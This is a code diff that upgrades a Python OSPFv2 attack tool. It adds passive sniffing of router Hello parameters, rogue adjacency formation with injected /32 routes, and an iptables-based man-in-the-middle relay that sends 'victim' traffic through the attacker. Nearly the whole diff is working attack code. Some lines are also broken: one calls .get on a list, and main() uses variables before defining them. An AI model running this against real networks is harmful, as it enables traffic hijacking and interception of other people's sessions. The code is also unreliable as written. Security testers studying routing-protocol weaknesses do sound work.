@@ -1,19 +1,29 @@
 #!/usr/bin/env python3
-# v1.1
+# v2.0
 """
-ospf_adjacency.py — OSPFv2 full-adjacency engine + route injection.
+ospf_adjacency.py — OSPFv2 full-adjacency engine + route injection + MITM relay.
 
-Self-contained module (the former ospf_route_addition helper is inlined below).
-Used two ways:
+Self-contained module.  Used two ways:
 
   Standalone CLI:
       sudo python3 ospf_adjacency.py --iface eth0 [--vlan 20]
       Runs the interactive engine with a menu (add Router-LSA routes, show LSDB).
 
   As a library (called by main.py):
-      launch_in_terminal(interface, vlan_id)   -> spawn this engine in a new
-                                                  terminal so its menu stays usable
-      wait_for_adjacency_exchange(iface, ip)   -> block until LS exchange is seen
+      sniff_ospf_hellos(iface)             -> passively learn SVI parameters from
+                                              OSPF Hello packets before forming
+                                              any adjacency
+      launch_in_terminal(interface, ...)   -> spawn the full-adjacency engine in a
+                                              new terminal so its menu stays usable
+      wait_for_adjacency_exchange(iface)   -> block until LS exchange is seen
+
+  MITM relay helpers (all Linux-only):
+      enable_ip_forwarding()               -> save and enable ip_forward
+      restore_ip_forwarding(old)           -> write back saved value
+      setup_forwarding(in_iface, out)      -> iptables FORWARD + MASQUERADE rules
+      teardown_forwarding(in_iface, out)   -> remove those rules
+      withdraw_injected_routes(context)    -> MaxAge-flood our Router-LSA to pull
+                                              injected stubs from neighbours' RIBs
 """
 from __future__ import annotations
 import argparse
@@ -61,6 +71,9 @@ OSPF_SNIFF_FILTER = "ip proto 89 or (vlan and ip proto 89)"
 OSPF_NBR_ROUTES_DB = {}
 AUTO_ROUTE_IP_ENV = "OSPF_AUTO_ROUTE_IP"
 
+OSPF_AREA_ID_ENV = "OSPF_AREA_ID"
+OSPF_DEAD_INTERVAL_ENV = "OSPF_DEAD_INTERVAL"
+
 DOWN = "DOWN"
 INIT = "INIT"
 TWO_WAY = "TWO_WAY"
@@ -84,6 +97,170 @@ MENU_HIDDEN_TEXT = "[MENU] The menu prompt is hidden. Type 'm' to show it again.
 def log_message(message):
     sys.stdout.write(f"[{time.strftime('%H:%M:%S')}] {message}\n")
     sys.stdout.flush()
+
+
+# ── Passive OSPF Hello sniffing ───────────────────────────────────────────────
+
+def sniff_ospf_hellos(iface, timeout=30, count=1):
+    """Passively sniff OSPF Hello packets on 224.0.0.5 to learn SVI parameters.
+
+    Returns a dict of learned params on success, or None on timeout.  The
+    caller uses these values to match timers/area/mask before forming an
+    adjacency, so the SVI accepts our Hellos without manual configuration.
+
+    Learned fields:
+        router_id      OSPF router ID of the SVI (OSPF_Hdr.src)
+        src_ip         SVI interface IP (IP.src) — also the subnet gateway
+        netmask        Interface netmask (OSPF_Hello.mask)
+        area_id        OSPF area identifier (OSPF_Hdr.area)
+        hello_interval Hello interval in seconds
+        dead_interval  Dead interval in seconds
+        options        Options byte (bit 1 = E, i.e. not-stub area)
+        auth_type      Authentication type (0=none, 1=simple, 2=MD5)
+        dr             Designated Router IP (0.0.0.0 if election pending)
+        bdr            Backup DR IP
+    """
+    learned = []
+
+    def _handle(pkt):
+        if not (pkt.haslayer(OSPF_Hdr) and pkt.haslayer(OSPF_Hello) and pkt.haslayer(IP)):
+            return
+        if pkt[OSPF_Hdr].type != 1:
+            return
+        h = pkt[OSPF_Hello]
+        params = {
+            "router_id":      str(pkt[OSPF_Hdr].src),
+            "src_ip":         str(pkt[IP].src),
+            "netmask":        str(h.mask),
+            "area_id":        str(pkt[OSPF_Hdr].area),
+            "hello_interval": int(h.hellointerval),
+            "dead_interval":  int(h.deadinterval),
+            "options":        int(h.options),
+            "auth_type":      int(getattr(pkt[OSPF_Hdr], "authtype", 0)),
+            "dr":             str(h.router),
+            "bdr":            str(h.backup),
+        }
+        learned.append(params)
+        return True  # stop_filter
+
+    log_message(f"[OSPF] Passively sniffing OSPF Hellos on {iface} (timeout={timeout}s)...")
+    sniff(
+        iface=iface,
+        filter=OSPF_SNIFF_FILTER,
+        prn=_handle,
+        store=False,
+        timeout=timeout,
+        stop_filter=lambda p: bool(learned),
+        count=count,
+    )
+
+    if not learned:
+        log_message(f"[OSPF] No OSPF Hellos received on {iface} within {timeout}s.")
+        return None
+
+    p = learned[0]
+    log_message("[OSPF] ── Learned SVI parameters ─────────────────────────────")
+    log_message(f"[OSPF]   router_id      : {p['router_id']}")
+    log_message(f"[OSPF]   src_ip (GW)    : {p['src_ip']}")
+    log_message(f"[OSPF]   netmask        : {p['netmask']}")
+    log_message(f"[OSPF]   area_id        : {p['area_id']}")
+    log_message(f"[OSPF]   hello_interval : {p['hello_interval']}s")
+    log_message(f"[OSPF]   dead_interval  : {p['dead_interval']}s")
+    log_message(f"[OSPF]   options        : 0x{p['options']:02x}  (E-bit={'set' if p['options'] & 0x02 else 'clear — stub area'})")
+    log_message(f"[OSPF]   auth_type      : {p['auth_type']}  ({['none', 'simple-password', 'MD5'].get(p['auth_type'], 'unknown') if isinstance(['none', 'simple-password', 'MD5'], list) else {0:'none',1:'simple-password',2:'MD5'}.get(p['auth_type'],'unknown')})")
+    log_message(f"[OSPF]   dr             : {p['dr']}")
+    log_message(f"[OSPF]   bdr            : {p['bdr']}")
+    log_message("[OSPF] ─────────────────────────────────────────────────────────")
+    return p
+
+
+# ── IP forwarding + iptables MITM relay helpers ───────────────────────────────
+
+_IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"
+
+
+def enable_ip_forwarding():
+    """Enable IPv4 forwarding; return the previous value so it can be restored."""
+    try:
+        with open(_IP_FORWARD_PATH) as f:
+            old = f.read().strip()
+    except OSError:
+        old = "0"
+    try:
+        with open(_IP_FORWARD_PATH, "w") as f:
+            f.write("1\n")
+        log_message(f"[FWD] ip_forward enabled (was {old!r})")
+    except OSError as exc:
+        log_message(f"[WARN] Could not enable ip_forward: {exc}")
+    return old
+
+
+def restore_ip_forwarding(old_value):
+    """Write back the previously saved ip_forward value."""
+    try:
+        with open(_IP_FORWARD_PATH, "w") as f:
+            f.write(f"{old_value}\n")
+        log_message(f"[FWD] ip_forward restored to {old_value!r}")
+    except OSError as exc:
+        log_message(f"[WARN] Could not restore ip_forward: {exc}")
+
+
+def _iptables(args, *, check=False):
+    result = subprocess.run(["iptables"] + args, capture_output=True, text=True, check=False)
+    if result.returncode != 0 and check:
+        log_message(f"[WARN] iptables {' '.join(args)}: {result.stderr.strip()}")
+    return result.returncode == 0
+
+
+def setup_forwarding(in_iface, out_iface):
+    """Add iptables FORWARD accept + MASQUERADE rules for transparent MITM relay.
+
+    Victim packets arriving on in_iface destined for the injected /32 are
+    forwarded out out_iface toward the real next-hop.  MASQUERADE rewrites the
+    source IP to ours so the real destination routes replies back to us rather
+    than directly to the victim — keeping the session symmetric.
+
+    Tradeoff: NAT (MASQUERADE) is simpler than injecting a reverse LSA for the
+    victim prefix, but the target sees our IP rather than the victim's.  Return
+    traffic is visible to us (we can proxy-inspect) but not passively sniffable
+    as unmodified victim→target flows.  A reverse Type-1 /32 LSA for the victim
+    would preserve source IPs at the cost of needing the victim's prefix up-front.
+    """
+    _iptables(["-A", "FORWARD", "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"])
+    _iptables(["-A", "FORWARD", "-i", out_iface, "-o", in_iface,
+               "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
+    _iptables(["-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
+    log_message(f"[FWD] Forwarding rules added: {in_iface} → {out_iface} (MASQUERADE)")
+
+
+def teardown_forwarding(in_iface, out_iface):
+    """Remove the iptables rules added by setup_forwarding()."""
+    _iptables(["-D", "FORWARD", "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"])
+    _iptables(["-D", "FORWARD", "-i", out_iface, "-o", in_iface,
+               "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
+    _iptables(["-t", "nat", "-D", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
+    log_message(f"[FWD] Forwarding rules removed: {in_iface} → {out_iface}")
+
+
+def withdraw_injected_routes(context):
+    """Withdraw our Router-LSA by re-flooding it with age=MaxAge (3600).
+
+    Per RFC 2328 §14.1: when neighbours receive a MaxAge LSA they install it,
+    then purge it and any routes it installed from their LSDB/RIB.  This cleanly
+    removes the injected /32 stub without waiting for natural LSA expiry.
+    """
+    with context["lock"]:
+        existing = find_lsa(context, 1, context["router_id"], context["router_id"])
+        if existing is None:
+            log_message("[TEARDOWN] No self Router-LSA found; nothing to withdraw.")
+            return
+        maxage_lsa = existing.copy()
+    maxage_lsa.age = 3600
+    try:
+        flood_lsa_packets(context, [maxage_lsa])
+        log_message("[TEARDOWN] Flooded MaxAge Router-LSA — injected routes will be purged.")
+    except Exception as exc:
+        log_message(f"[TEARDOWN] Could not flood MaxAge LSA: {exc}")
 
 
 # ── Router-LSA route injection (inlined from former ospf_route_addition.py) ────
@@ -299,15 +476,18 @@ def make_neighbor(router_id, ip_address):
     }
 
 
-def make_context(interface_name, source_ip, network_mask, hello_interval, auto_route_ip=None):
+def make_context(interface_name, source_ip, network_mask, hello_interval,
+                 auto_route_ip=None, area_id=BACKBONE_AREA, dead_interval=DEAD_INTERVAL):
     return {
         "interface_name": interface_name,
         "source_ip": source_ip,
         "router_id": DEFAULT_ROUTER_ID,
         "network_mask": network_mask,
+        "area_id": area_id,
         "designated_router": "0.0.0.0",
         "backup_designated_router": "0.0.0.0",
         "hello_interval": hello_interval,
+        "dead_interval": dead_interval,
         "local_lsdb": [],
         "neighbors": {},
         "lock": threading.RLock(),
@@ -398,7 +578,7 @@ def send_packet(context, payload, destination=ALL_SPF_MULTICAST):
 
 
 def build_header(context, packet_type):
-    return OSPF_Hdr(version=2, type=packet_type, src=context["router_id"], area=BACKBONE_AREA)
+    return OSPF_Hdr(version=2, type=packet_type, src=context["router_id"], area=context["area_id"])
 
 
 def build_ls_update(context, lsa_packets):
@@ -980,7 +1160,7 @@ def handle_lsreq(context, packet):
 def dispatch_packet(context, packet):
     if not packet.haslayer(OSPF_Hdr):
         return
-    if packet[OSPF_Hdr].area != BACKBONE_AREA:
+    if packet[OSPF_Hdr].area != context["area_id"]:
         return
     if packet.haslayer(IP) and packet[IP].src == context["source_ip"] and packet[OSPF_Hdr].src == context["router_id"]:
         return
@@ -1093,7 +1273,7 @@ def run_engine(context):
                 expired = [
                     (router_id, neighbor)
                     for router_id, neighbor in context["neighbors"].items()
-                    if time.time() - neighbor["last_seen"] > DEAD_INTERVAL
+                    if time.time() - neighbor["last_seen"] > context["dead_interval"]
                 ]
                 lost_full_neighbor = context["adjacency_ready_event"].is_set() and any(
                     neighbor["state"] == FULL and is_dr_or_bdr_neighbor(neighbor)
@@ -1113,6 +1293,7 @@ def run_engine(context):
             time.sleep(context["hello_interval"])
     except KeyboardInterrupt:
         context["stop_event"].set()
+        withdraw_injected_routes(context)
         close_ospf_raw_socket(context)
         log_message("\n[*] Exiting.")
 
@@ -1147,20 +1328,33 @@ def wait_for_adjacency_exchange(interface, source_ip, timeout=OSPF_FULL_WAIT_TIM
     raise TimeoutError(f"Timed out waiting for OSPF adjacency exchange on {interface}")
 
 
-def launch_in_terminal(interface, vlan_id=None, auto_route_ip=None):
+def launch_in_terminal(interface, vlan_id=None, auto_route_ip=None,
+                       area_id=None, hello_interval=None, dead_interval=None):
     """Run this OSPF engine in a new Linux terminal so its interactive menu works.
 
     On non-Linux hosts, falls back to a blocking foreground run.
+    area_id, hello_interval, and dead_interval (learned from sniff_ospf_hellos)
+    are forwarded to the child process so it matches the SVI's parameters exactly.
     """
     ospf_script = Path(__file__).resolve()
     ospf_command = [sys.executable, str(ospf_script), "--iface", interface]
     child_env = os.environ.copy()
     if vlan_id is not None:
         ospf_command.extend(["--vlan", str(vlan_id)])
+    if hello_interval is not None:
+        ospf_command.extend(["--interval", str(int(hello_interval))])
     if auto_route_ip is not None:
         child_env[AUTO_ROUTE_IP_ENV] = str(ipaddress.IPv4Address(auto_route_ip))
     else:
         child_env.pop(AUTO_ROUTE_IP_ENV, None)
+    if area_id is not None:
+        child_env[OSPF_AREA_ID_ENV] = str(area_id)
+    else:
+        child_env.pop(OSPF_AREA_ID_ENV, None)
+    if dead_interval is not None:
+        child_env[OSPF_DEAD_INTERVAL_ENV] = str(int(dead_interval))
+    else:
+        child_env.pop(OSPF_DEAD_INTERVAL_ENV, None)
 
     if platform.system().lower() != "linux":
         log_message(f"[*] Launching OSPF full adjacency engine on {interface}")
@@ -1214,6 +1408,7 @@ def main():
     log_message("=" * 52)
     log_message("  OSPFv2 Full Adjacency Engine")
     log_message(f"  iface={ospf_interface}  src={source_ip}  rid={DEFAULT_ROUTER_ID}")
+    log_message(f"  area={area_id}  hello={args.interval}s  dead={dead_interval}s")
     log_message("=" * 52)
 
     auto_route_ip = os.environ.get(AUTO_ROUTE_IP_ENV)
@@ -1223,7 +1418,28 @@ def main():
         except ipaddress.AddressValueError:
             log_message(f"[WARN] Ignoring invalid {AUTO_ROUTE_IP_ENV} value: {auto_route_ip}")
             auto_route_ip = None
-    context = make_context(ospf_interface, source_ip, network_mask, args.interval, auto_route_ip=auto_route_ip)
+
+    area_id = os.environ.get(OSPF_AREA_ID_ENV, BACKBONE_AREA)
+    try:
+        ipaddress.IPv4Address(area_id)
+    except ipaddress.AddressValueError:
+        log_message(f"[WARN] Ignoring invalid {OSPF_AREA_ID_ENV} value: {area_id!r}")
+        area_id = BACKBONE_AREA
+
+    dead_interval = DEAD_INTERVAL
+    raw_dead = os.environ.get(OSPF_DEAD_INTERVAL_ENV)
+    if raw_dead:
+        try:
+            dead_interval = int(raw_dead)
+        except ValueError:
+            log_message(f"[WARN] Ignoring invalid {OSPF_DEAD_INTERVAL_ENV} value: {raw_dead!r}")
+
+    context = make_context(
+        ospf_interface, source_ip, network_mask, args.interval,
+        auto_route_ip=auto_route_ip,
+        area_id=area_id,
+        dead_interval=dead_interval,
+    )
     refresh_local_router_lsa(context)
     run_engine(context)
 
